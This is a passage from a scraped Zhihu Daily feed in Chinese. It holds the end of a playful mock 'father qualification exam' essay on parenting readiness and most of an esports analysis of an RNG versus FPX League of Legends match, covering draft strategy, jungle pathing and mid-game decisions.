楼跳下身亡，对此事件你有何看法？</p>\n<p>（这两个热点事件在知乎站内有相关话题，感兴趣的朋友可以自行搜索）</p>\n<p><strong>五、</strong><strong>作文</strong></p>\n<p>有人说“夫妻关系大于亲子关系”，你赞同吗？请围绕此话题创作一篇不低于 500 字的文章。</p>\n<p><strong> 实操部分</strong></p>\n<p>1. 请演示为 0-3 月龄宝宝拍嗝的正确方法。</p>\n<p>2. 请演示为宝宝换纸尿裤及冲奶粉的正确方法。</p>\n<p>3. 请演示海姆利克急救法。</p>\n<p>4. 请演示如何为孩子做心肺复苏。</p>\n<p>5. 请演示孩子烫伤烧伤后的正确急救措施。</p>\n<p>不是说要考试嘛，咱就先出个试卷看看呗~以上这份“全国父亲执业资格证考试”由我本人设计，大家觉得怎么样哈哈！还没结婚或生娃的朋友是不是会觉得很难，已经成为准爸妈或已经是有娃爸妈的你都能答出来吗？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e89631f14ddf74c5ac58a1aea66a386c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>大家也看到了，考试分为笔试和实操两部分：</p>\n<p>♥︎ 笔试部分第一大题，其实就是送分题，大家都会照着标准答案去选“是”或“否”，<strong>但出题的目的其实是想让准爸爸们静下心好好思考一下自己是否真的做好了准备，对自己每一个答案负责</strong>。</p>\n<p>♥︎ 第二大题选择题，<strong>10 道题的正确答案都为 D 哦</strong>！这 10 题是我假装从“题库”里随机抽取的，既然要考试肯定会有题库的嘛！大家应该发现了这 10 题重在考查育儿知识的储备，帮助大家在真的有了孩子后可以科学备产、科学带娃，不信谣不踩坑。</p>\n<p>♥︎ 第三大题简答题，也假装是从“题库”里抽取的哈，主要考查准爸爸在孩子教育和培养方面的一些基础准备。</p>\n<p>♥︎ 第四大题热点分析题，主要了解准爸爸的育儿观念以及自身的三观和心理是否健康。</p>\n<p>♥︎ 第五大题作文，目的很明确啦，就是想让准爸爸们好好想一想自己扮演的各个角色，自己在小家中起到的作用，如何在有娃后维持良好的夫妻关系、亲子关系等。</p>\n<p>♥︎ 实操部分就更加清晰明了，考查准爸爸带娃的基本技能和关键时刻的急救技能。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a9d876354adcab50d093fbf3013cb1c1_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>为什么我会先设计出一份“父亲资格证”试卷而非“母亲资格证”的呢？</strong>因为就我们国内目前的情况来看，绝大部分男性在老婆孕前做的准备是很少的，在老婆产后进入父亲角色也很慢，“甩手爸爸”、“丧偶式育儿”很常见，所以我觉得男性更应该加强学习，当然女性也应该提前做好各方面准备，男女双方都应该为自己的行为负责、为即将到来的新生命负责。</p>\n<p><strong>以我设计的这张“闹着玩儿”的试卷为例，我们给要做父母的人考试，主要是想考什么？目的是什么？</strong></p>\n<p>我们常常在看到亲生父母“弃养”、“虐童”、马虎大意造成孩子发生意外、教坏孩子等新闻事件时，都会很愤慨地问：这样的人凭什么生孩子？为什么什么样的人都可以做父母？</p>\n<p><strong>“一想到为人父母不用经过考试，就觉得真是太可怕了”，这句经典的话出自日本作家伊坂幸太郎，这句话也已经让世界各国人民产生了共鸣。</strong></p>\n<p>所以在一个人成为父母前，我们想要考查的是这个人是否具备正常的三观、是否具备基本的生存能力、是否掌握一定的育儿知识、是否做好了一定的心理准备和人生规划等。<strong>考试的目的就在于鼓励真正想要努力成为好父母的人充实自己，让不具备条件、暂不适合做父母的人延缓做父母的计划、接受再教育。</strong></p>\n<p><strong>但是考试这种方式就绝对有效吗？</strong>在我看来，或许考试真的可以刷掉一些不适合做父母的人，但同时也定有一部分不擅长考试的人会遭受不公，比如文化程度不高、语言表达能力有限、所处地区学习资源闭塞等，这样的人未必做不了好父母。同理，一些非常擅于考试的人，题都会做，做得还很符合标准答案，但通过了考试后就一定能成为好父母吗？</p>\n<p>成为父母，如果有一场真实的考试可以让我们更加慎重地对待生儿育女这件事，能让我们提前做一些必要的知识准备，我觉得是很好的。但是，传统考试局限性很大，人也是在不断发展变化的。<strong>有些东西可以被考试体现出来，而有些东西永远无法通过考试去测出真实水平。</strong></p>\n<p><strong>除此之外，在我看来，人生是一场接着一场的考试，不可能用某一场考试成绩给一个人下定论。也许我们在考取父母资格证时成绩并不理想，但是在现实生活中父母是和孩子一同成长的啊，谁也不可能打一开始就是完美父母！</strong></p>\n<p>的确，有一些知识我们可以提前学习，比如幼儿疾病、儿童心理、成人疾病、成人心理等，这些我们确实可以通过书本和课程去了解；<strong>但是，有很多东西是随着我们人生阅历的增加而不断累积或改善的，比如我们爱人的能力、管理情绪的能力、与孩子沟通交流的能力、与自己和解的能力等等。</strong></p>\n<p><strong>我们给予孩子的爱不是随着孩子的降生就立刻奔涌而来，而是在日复一日与孩子的相处中不断累积起来的。</strong>在有了孩子后，我们对自己、对爱人、对家人、对社会、对生命、对未来的认知都会发生改变！<strong>这些，都是我们在成为父母前无法预知的，也是一场考试无法模拟的。</strong></p>\n<p>生活中时时处处都是隐形的考试，比如选择什么样的分娩方式、与爱人产生育儿分歧、要不要拼尽全力买学区房等等，我们的态度、抉择、处理方式会带来不同的结果、不同的境遇，而这结果、这境遇不就像是我们得到的成绩吗？最终我们培养出了一个什么样的孩子，不也是对父母的一种评定吗？</p>\n<p><strong>所以，不要以为当父母真的没有考试，其实我们时时处处都在被考验，命运正在无形中为我们打着分数，最后究竟累计得到多少分，这要看做父母的人自己的修为了吧。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-23e09951b07022cd78802ef2cfab2052_720w.jpg?source=8673f162\" alt=\"\"><figcaption>成为父母是一种荣誉，感谢孩子赋予我们做父母的光芒，和孩子一同成长，做孩子的榜样，让父母和孩子彼此成就，都能成为更好的人。</figcaption></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/465553584\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737560"},{"title":"S11夏季赛RNGvsFPX复盘：英雄池差距与运营差距的比赛","date":"2021-06-28 16:15:08","description":"\n<p>大家好，我是尹天，这里是尹天的复盘系列，久违了。</p>\n<p>夏季赛到今天都没怎么写复盘，主要是因为比赛质量低下，难以提起兴趣。故在看完FPX和RNG的第一局之后，我立刻意识到，今晚应该闲不下来了。</p>\n<p>在第一局，FPX展现了当前版本几乎不可能完成的运营：拖住中期劣势。在面对有着优秀运营底子的RNG时 能完成这一点，足以证明FPX目前上限之高。所以，今天关于FPX的内容，我会主要分析他们的运营部分，对于一些亮眼操作可能会放过去。</p>\n<p>在RNG的部分，我会着重讨论他们前中期的兵线理解、BP困境（也就是英雄池困境），或许会嘴一下选手的操作。重点是1、2局，第三局纯粹个人打的太差，没有分析价值。</p>\n<hr>\n<h2>第一局</h2>\n<h3>一、BP分析</h3>\n<p>在开始讨论BP之前，我们先来看一下双方对Ban位的理解。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-50c823315f169a8e97bca3996ebfec32_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1816\" data-rawheight=\"442\" class=\"origin_image zh-lightbox-thumb\" width=\"1816\" data-original=\"https://pic3.zhimg.com/v2-50c823315f169a8e97bca3996ebfec32_r.jpg\"></figure><p>双方今晚，RNG三把蓝，三局一轮ban阿卡丽、锤石、赛娜。FPX三把红，三局一轮banEZ、赵信、卢锡安。双方的BP策略根本方向上是一致的，只是大方向有所不同。</p>\n<p>我们来看看，双方为什么采用如此一致的第一轮BP策略。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-e658a0ec5dcfa0fb12068a5edb77ae11_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1754\" data-rawheight=\"822\" class=\"origin_image zh-lightbox-thumb\" width=\"1754\" data-original=\"https://pic2.zhimg.com/v2-e658a0ec5dcfa0fb12068a5edb77ae11_r.jpg\"></figure><p>在RNG这边，FPX的赛娜是首先要解决的点。目前FPX是联盟中最多次使用赛娜战术的队伍，Lwx五次选用赛娜，胜率80%。赛娜战术是目前快节奏版本里，唯二可以打大后期的下路组合（另外一个是大嘴露露），而且因为塔姆补刀所以中期战斗力更强。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f08f7949af242e43e7beb05c2d4ca936_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1540\" data-rawheight=\"1050\" class=\"origin_image zh-lightbox-thumb\" width=\"1540\" data-original=\"https://pic3.zhimg.com/v2-f08f7949af242e43e7beb05c2d4ca936_r.jpg\"></figure><p>目前，赛娜处于一个多数队伍不太会用，但是只要敢选就很容易打出效果的状态。</p>\n<p>夏季赛到现在，赛娜选用场次只有13场，不多，但是胜率却有69.2%，是使用场次排名前五的AD里胜率最高的。当对上擅长使用赛娜体系的队伍时，赛娜是必须承担的Ban位。</p>\n<p>至于阿卡丽，因为Doinb近期阿卡丽表现不错，而Cryin不会阿卡丽无法自己选，所以蓝色开阿卡丽会是相当糟糕的做法。另外，多说一句，RNG到目前为止，只开过两次阿卡丽。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a1271a37e1529e875d25322baa6e251d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2074\" data-rawheight=\"944\" class=\"origin_image zh-lightbox-thumb\" width=\"2074\" data-original=\"https://pic2.zhimg.com/v2-a1271a37e1529e875d25322baa6e251d_r.jpg\"></figure><p>就是打OMG的两场，然后被阿卡丽绝活选手Creme操作了一通。</p>\n<p>而关于锤石，这一点似乎FPX在之前比赛中没有表现太多的重视，无论是被ban还是自选，次数都很少。</p>\n<p>唯一比较合理的解释是，FPX和WE的比赛中，FPX第二局拿出厄斐琉斯锤石的下路组，而RNG认为他们没有办法破解类似组合，参照RNG对LNG第一局LNG的金克丝锤石。RNG自己选金克丝锤石并没有取得胜利，在无法破解+无法选用的情况下，锤石自然只能ban掉。</p>\n<p>然后是FPX。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-4da6309a88208241e49c8d9f55387e1e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1216\" data-rawheight=\"460\" class=\"origin_image zh-lightbox-thumb\" width=\"1216\" data-original=\"https://pic3.zhimg.com/v2-4da6309a88208241e49c8d9f55387e1e_r.jpg\"></figure><p>EZ是GALA夏季赛使用最多的英雄，场次上完全超过其他。而在BLND%（先选率）上，RNG仅仅在给GALA选EZ时，会尝试比对面AD先选，其他所有英雄到目前都是对位后选。可以说，目前EZ是RNG和GALA最自信的下路体系，有ban的价值。</p>\n<p>卢锡安我不用多说，赵信也很简单，赵信+卡尔玛是RNG在夏季赛唯一赢得比赛的体系，虽然因为对手是RW而导致含金量不足，但毕竟是RNG最自信的体系，尊重一手完全没有问题。</p>\n<p>这样一来，鳄鱼和盲僧再度被双开出来：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c6376ea84456daa1b8921cf9f9bbc747_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2710\" data-rawheight=\"1516\" class=\"origin_image zh-lightbox-thumb\" width=\"2710\" data-original=\"https://pic4.zhimg.com/v2-c6376ea84456daa1b8921cf9f9bbc747_r.jpg\"></figure><p>1、第一轮BP</p>\n<p>RNG拿走鳄鱼，FPX对着拿走兰博+盲僧。</p>\n<p>鳄鱼的优先级大于盲僧，在对上线的情况下鳄鱼算是处理盲僧的选择之一，所以职业队伍会在开盲僧的情况下先抢鳄鱼，OMGvsBLG、TTvsUP都采用这样的策略来进行兑子。</p>\n<p>在11.12版本UD被砍以后，目前打野T1就是赵信、兰博、皎月，优先级为赵信＞兰博=皎月。在没有赵信的情况下，兰博皎月可以看情况来拿，皎月适合冲阵体系，兰博适合配poke和一些偏阵地战的阵容。</p>\n<p>RNG对着拿走皎月，然后选出上单格温，确定鳄鱼给中，符合大家对RNG英雄池的一贯预期。FPX第三手拿走瑟提，做一个摇摆位。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>2、第二轮BP</p>\n<p>FPXban露露、卡莎，限制RNG下路组合选择。RNGban梦魇、武器，他们担心瑟提会摇去辅助，限制掉一些可以操作上单格温的英雄。</p>\n<p>在场上主流AD已经没多少的情况下，FPX先拿走维鲁斯，没问题。RNG对着拿滑板鞋+泰坦，这个组合就算你下路是维鲁斯+瑟提，配合打野一样可以将维鲁斯击杀，展露出了极强的希望打下半区的意图。</p>\n<p>这时候FPX也没什么办法，瑟提不敢再放在下路，不然维鲁斯指定没什么好果汁吃，必须要拿塔姆来保护维鲁斯，那么瑟提就只能摇去上路。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>3、阵容评价</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-249d8052ef13f1a7d0746a5457fe510f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2714\" data-rawheight=\"1506\" class=\"origin_image zh-lightbox-thumb\" width=\"2714\" data-original=\"https://pic4.zhimg.com/v2-249d8052ef13f1a7d0746a5457fe510f_r.jpg\"></figure><p>从对线上来说，上路格温小劣，中路鳄鱼优势，下路滑板鞋+泰坦3级后更容易拿到线权。</p>\n<p>RNG的阵容中野极度强势，鳄鱼+皎月基本是当前版本最强中野，双稳定控制让这个组合下限极高，这一点优于盲僧+兰博。RNG需要利用中野的优势，尽可能的去多游走下路，利用下路多重稳定控制打开局面，进而解放泰坦，中期利用滑板鞋的强势期带动节奏，快速拿下比赛。</p>\n<p>FPX的阵容更依赖上野配合，瑟提+兰博的组合下限也很高，所以他们更依赖上野优势尽快打穿，把格温打成极度劣势的情况，劣势格温用处很小。然后再通过上半区的优势辐射下路，中期利用兰博的强势点在地图资源上进行团战，快速滚雪球拿下比赛。</p>\n<p>理论分析是这样，但是两队很快打成了完全相反的样子。。。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>二、对局分析</h3>\n<p>我们分两个部分：前期双方打野博弈、中期FPX运营思路</p>\n<p>1、前期打野博弈：上单如何打乱打野节奏？</p>\n<p>为什么在职业赛场上，被单杀是超出底线的失误？因为这不仅仅会让你线上受损，更会让整个团队的战术布置失效。</p>\n<p>我们从1级开始说。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2933f264ea30c54a00e9a9a08e31198e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"392\" data-rawheight=\"388\" class=\"content_image\" width=\"392\"></figure><p>双方1级都在RNG的红区做了视野，不同的是FPX先做，而RNG后做。</p>\n<p>这样一来，RNG就有了应对该视野的机会，Ming回家出了个扫描，和AD一起把眼排掉，Wei直接蓝开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-18827272e785a2f40ae35b4c9218b87e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"390\" class=\"content_image\" width=\"394\"></figure><p>蓝开的Wei让FPX很不安，他们在上半地图全无视野，不知道Wei到底是什么路线。FPXping了两个BUFF，意思就是不确定Wei会不会来换野区。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c4a2f621bc637ae54a98139c3863ab97_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"406\" class=\"content_image\" width=\"402\"></figure><p>随后，鳄鱼利用前期推线的优势，率先把兵线推了过去并做了一个F6视野。这个在视野教学中和大家提到过，是一个中单有线权时，非常好用的F6眼位。</p>\n<p>通过这个眼，RNG确定，兰博是清半区的刷野思路。而看到鳄鱼离开线上，FPX立刻产生警觉，此时如果皎月和优势兵线的鳄鱼去上半区，第一时间FPX中野一定会更慢，因为盲僧没有线权。</p>\n<p>加上刚刚不确定皎月的路线，兰博索性直接往下半区走，他想确定皎月的路线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b24f07c76a3d5ca2821b0d9c957bc35b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"392\" class=\"content_image\" width=\"400\"></figure><p>虽然因此确定了皎月的刷野路线，但兰博的路线也被RNG完全确定。</p>\n<p>我们回顾一开始的开野顺序，RNG往下，是想保护下半区。因为前三级兵线优势在FPX手里，所以3级以后，兵线要么在塔前，要么推进去开始回流，打野抓下是最佳机会。所以你看，FPX的辅助去三角草做了一个眼，就是想保护对线。</p>\n<p>相对的，去上的FPX想保护上半区，同样的道理，瑟提前3级有线权，所以只要兵线推进去，三级以后兵线回流，打野速4是正好抓到的。可是小虎没有在上半区做眼，所以Tian这波很有机会抓到。</p>\n<p>两队节奏都布置的很有条理，但是Nuguri被单杀，直接让这个平衡被打破。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-8dae5d6b2ed7a1aa2e2e6b8aba44e74f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1534\" data-rawheight=\"1070\" class=\"origin_image zh-lightbox-thumb\" width=\"1534\" data-original=\"https://pic4.zhimg.com/v2-8dae5d6b2ed7a1aa2e2e6b8aba44e74f_r.jpg\"></figure><p>注意时间，3分16。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-db2f958b39388a11baf9a80e60ee6f54_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>3分16是正常打野完成速4的时间点，此时刷的比较快的一般都刷完四组，大家可以参照一直在刷野没停过的Wei，他就是正好此时速4。如果Nuguri能晚十五秒出问题，兰博就能打完红去上，他就不会死，兰博的刷野路线就能有所收获。</p>\n<p>随着上单阵亡，Tian和Doinb立刻调整路线。因为Ming把Crisp的三角草视野排掉，Wei打算去三角草看看情况，而发现眼被拆掉的Doinb立刻往下走，Tian也放掉石甲虫转而去下，双方的重点立刻聚焦在下路。</p>\n<p>此时，中路兵线被盲僧推进去，即将呈现回推。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-98c93d20e91ff96542eb4dd466a572ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1944\" data-rawheight=\"1012\" class=\"origin_image zh-lightbox-thumb\" width=\"1944\" data-original=\"https://pic3.zhimg.com/v2-98c93d20e91ff96542eb4dd466a572ae_r.jpg\"></figure><p>3分33，RNG在下路收获人头。滑板鞋泰坦前期爆发太高了。鳄鱼看到盲僧下来也交T保队友，没什么问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-06d93dbaae5efe4f0005247c58880bf9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"388\" data-rawheight=\"384\" class=\"content_image\" width=\"388\"></figure><p>从打完红到3分33，时间足够兰博走到下路，顺便刷河道蟹。对于没有视野的RNG来说，正常的兰博都会走石甲虫-河道蟹的路线，他们完全没想到兰博会绕道来下。</p>\n<p>你看，第一时间，状态还有一半的皎月在回城，没人想得到T下来的鳄鱼会出事。</p>\n<p>此时，中路兵线正在回推。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-f806714353cf013fd6aac94b870b48e7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"406\" data-rawheight=\"406\" class=\"content_image\" width=\"406\"></figure><p>等到盲僧走回线上，一波无比巨大的回推线等着他吃，鳄鱼走到线上会亏至少两波兵线的经验，中路对线基本结束了，战士打战士，最不能接受的就是落后等级。</p>\n<p>这波鳄鱼T下路支援有没有问题？我认为没有，更多是Tian反思维的路线做的好，RNG不可能考虑得到Tian会来下半区，他们完全没有考虑到Tian可能的蹲伏。</p>\n<p>然后Nuguri又被小虎单杀了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-267002cad4c09f1208785babbb4fa43a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"392\" data-rawheight=\"402\" class=\"content_image\" width=\"392\"></figure><p>这波单杀之前，兰博路线是先去上刷留下来的石甲虫，然后继续往下，Tian很细节地把原本完全相反的打野路线调整到和Wei平齐，这样可以保证一定能在下路蹲到Wei的下一次进攻，大家能看到皎月头像上面的红色方问号，这就是Tian调整打野路线的意义。</p>\n<p>这种情况下，上路一定不能出事，出了事儿没有人能来帮的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-02dd80d68f687394eb430220f6c4fe68_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1048\" data-rawheight=\"952\" class=\"origin_image zh-lightbox-thumb\" width=\"1048\" data-original=\"https://pic1.zhimg.com/v2-02dd80d68f687394eb430220f6c4fe68_r.jpg\"></figure><p>结果就出事了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-a81d689858eb3aae0b4216e3e1e752d6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"398\" class=\"content_image\" width=\"402\"></figure><p>出事儿的同时，中路Doinb推了线以后没去游走，反而是跟鳄鱼塔下操作了一波，双方互相残血。</p>\n<p>那么Tian的时间就被浪费了，他在下路蹲了很久很久。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1b80f56864f49fabee35da1adc78aee5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"410\" data-rawheight=\"398\" class=\"content_image\" width=\"410\"></figure><p>Wei是没有反蹲的，他刷完直接回家，此时Wei领先Tian一个回城再出来的20秒左右时间。Wei利用这个时间排干净了上半区红色方视野，同时率先开始刷自己的野区。</p>\n<p>面对打野落后的局面，FPX变招很快，他们准备把辅助调来上半区。同时，因为上半区的两次被单杀，Tian再次更改自己的刷野路线，选择蓝-石甲虫，再度回到以上路为中心，牺牲掉好不容易对应起来的往下的路线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bf9912c401d04057edea0f8ff10a2da1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"410\" class=\"content_image\" width=\"408\"></figure><p>因为皎月拆了眼，所以FPX判断草丛有视野，塔姆贴着墙壁走，绕过了这个草丛没有被RNG发现。那么这波塔姆的存在就是FPX对RNG的信息差，很容易利用这个信息差做到事情，至少可以排掉RNG上半区的视野。</p>\n<p>问题是，Nuguri在皎月已经在上半区拆眼的情况下，他完全没考虑打野来抓自己的可能。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-c5a53345bcd5d14937a993e158cb78cc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1388\" data-rawheight=\"1024\" class=\"origin_image zh-lightbox-thumb\" width=\"1388\" data-original=\"https://pic1.zhimg.com/v2-c5a53345bcd5d14937a993e158cb78cc_r.jpg\"></figure><p>压线太深，眼看到皎月的时候已经晚了。</p>\n<p>这三波小虎打的都很好，该拼就拼该卖就卖。但是Nuguri被击杀三次无论如何都说不过去，因为他，FPX第一波向上的路线没有收益，第二波好不容易把路线调整和RNG一样，又要为了上半区调回去，而塔姆支援的信息差也没能获得人头收益，仅得到一个先锋。</p>\n<p>这就是单杀的最大不利后果：队友的战术被迫围绕你来走，而很多东西执行到一半因为你的阵亡而无法取得收益。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>2、中期运营思路：FPX是怎么拖住的？</p>\n<p>FPX中期能拖住的关键，是他们在交换资源上做的非常好。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b950fe3ecebe6e3868bd7b77029073ee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"400\" class=\"content_image\" width=\"398\"></figure><p>在队友劣势的情况下，Doinb没有贸然去支援。比如这波三个人想去上路抓Nuguri，但是全都失败了，不过Doinb一开始就没打算去，他决定留在中路，利用先锋去吃了两个镀层。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b81db777e405125d3882e9ea2cecef30_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"406\" class=\"content_image\" width=\"402\"></figure><p>或者是在鳄鱼离开线上以后，偷吃RNG的F6。</p>\n<p>在他不断偷发育偷经济的时候，处于攻势的RNG来了一波有点问题的兵线运营：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-68f395fe094c2d40db20089148e51fb7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"396\" class=\"content_image\" width=\"398\"></figure><p>此时，皎月在打先锋，FPX想放弃先锋重点去争夺小龙，所以他们让Lwx去处理下路兵线。不过Lwx走得太深入了，遭到了小虎的绕后TPgank。</p>\n<p>这波大家都记得，不过，大家记不记得这波打完以后RNG的处理？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1963725442ab3542080760711516e852_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"398\" class=\"content_image\" width=\"394\"></figure><p>他们让鳄鱼去上，AD和辅助去下，中路完全空置。等到打完小龙以后，一个状态一般的格温才走到中路去清线。</p>\n<p>FPX立刻意识到，此时他们在中塔争夺上，人数反而比RNG更多，因为RNG重点在下路和小龙！</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-cd2a2271ed6d4801627115d032f4c11f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2144\" data-rawheight=\"1014\" class=\"origin_image zh-lightbox-thumb\" width=\"2144\" data-original=\"https://pic4.zhimg.com/v2-cd2a2271ed6d4801627115d032f4c11f_r.jpg\"></figure><p>盲僧果断交R打格温的血量，随后配合支援过来的队友将中一塔拆掉。</p>\n<p>RNG用中一塔为代价，交换到一只先锋、一条小龙、一座下一塔，赚一定是赚的。不过先推掉中一塔的人会有一个优势，那就是在推掉中一塔的时候，两侧一定处于无人看守的阶段，此时抓边成功率极高。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0fbe0cd81d8236e44e4d0067a4fbcc47_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"386\" class=\"content_image\" width=\"400\"></figure><p>RNG不是没有察觉，他们狂ping小地图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bc021b8ed64c759339a877384b723c1b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1230\" data-rawheight=\"1050\" class=\"origin_image zh-lightbox-thumb\" width=\"1230\" data-original=\"https://pic4.zhimg.com/v2-bc021b8ed64c759339a877384b723c1b_r.jpg\"></figure><p>然后Cryin还往回走。。。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9231873970d1ce939fbdbea93da878ae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"398\" class=\"content_image\" width=\"398\"></figure><p>这波Cryin阵亡，保住上一塔，同时RNG推掉FPX中一塔，你说谁赚？</p>\n<p>一定是FPX。</p>\n<p>第一，Cryin的人头被Nuguri吃到，大大弥补了后者的发育不良。</p>\n<p>第二，FPX推掉RNG中一的时候，中路有三个人，可以快速实施抓边。而RNG只有一个人来推FPX的中一塔，下路双人组和上单都需要去两条边路清线，拆掉中一塔以后没有办法迅速做入侵视野。</p>\n<p>这波不如放掉上一塔都好一点，RNG双人组在中的话，可以去FPX野区做很多深入的眼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-539899f93fc59357e1bc7969799b6ce2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"394\" data-rawheight=\"390\" class=\"content_image\" width=\"394\"></figure><p>RNG曾经试着聚集起来，看看能不能做深入视野，但FPX完全没有给到他们机会。相反，瑟提还在上路自由发育带线，非常舒服。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6f864f3c5df88a9acbb62f91d92d02a6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"396\" class=\"content_image\" width=\"398\"></figure><p>而等到FPX聚集到一起做视野的时候，他们就做了一个非常优秀的视野。看小地图，做在RNG蓝buff那边的假眼。</p>\n<p>这个假眼，给到了FPX抓死小虎的伏笔。因为Doinb就是TP这个眼，成功绕后的。</p>\n<p>我们以这张图来看RNG的视野，很明显没有几个。作为推掉三路外塔的一方，RNG视野如此没有侵略性，也是不该的。</p>\n<p>而且在分线期，RNG让发育一般的鳄鱼去下路对抗盲僧，而让发育领先的格温去上路守瑟提的线。但是在此过程中，他们既没有考虑在上半区做眼，去抓发育不良的瑟提，也没有考虑让格温去下，利用单打创造优势。算上视野，RNG的分线期基本什么都没有做。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-faede93fc47c353246b1e34ced70edec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"982\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-faede93fc47c353246b1e34ced70edec_r.jpg\"></figure><p>FPX抓到小虎，终结给到Tian，FPX中期支点终于获得巨量经济。</p>\n<p>随后，两队在小龙处打了一个旗鼓相当的团战，虽然结果是RNG取胜。但因为小虎的不断冒进，RNG丢失了打大龙的机会，让FPX最终在关键团前，拖到了盲僧的蓝盾。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d940d3d63aad58d2a4e36fa2abdace5d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1014\" data-rawheight=\"336\" class=\"origin_image zh-lightbox-thumb\" width=\"1014\" 